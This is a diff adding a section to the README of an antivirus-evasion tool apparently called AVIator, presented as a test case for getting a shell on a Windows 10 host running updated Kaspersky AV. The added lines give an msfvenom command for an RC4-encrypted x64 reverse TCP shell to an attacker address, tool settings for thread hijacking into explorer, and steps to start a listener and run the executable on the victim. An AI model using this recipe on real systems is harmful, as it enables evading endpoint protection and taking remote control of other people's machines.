@@ -26,6 +26,32 @@ The shellcode should be provided as a C# byte array. The default values contain 
 
 After filling the provided inputs and selecting the output path an executable is generated according to the chosen options. 
 
+
+#### Bypassig Kaspersky AV on a Win 10 x64 host (TEST CASE) 
+
+Getting a shell in a windows 10 machine running fully updated kaspersky AV 
+
+####Target Machine: windows 10 x64 
+
+1. Create the payload using msfvenom 
+
+msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread RC4PASSWORD=17DV11 -f csharp
+
+2. Use AVIator with the following settings
+
+Target OS architecture: x64
+
+Injection Technique: Thread Hijacking (Shellcode Arch: x64, OS arch: x64) 
+
+Target procedure: explorer (leave the default)
+
+3. Set the listener on the attacker machine
+
+4. Run the generated exe in the victim machine
+
+
+
+
 #### Installation
 
 **Windows:**
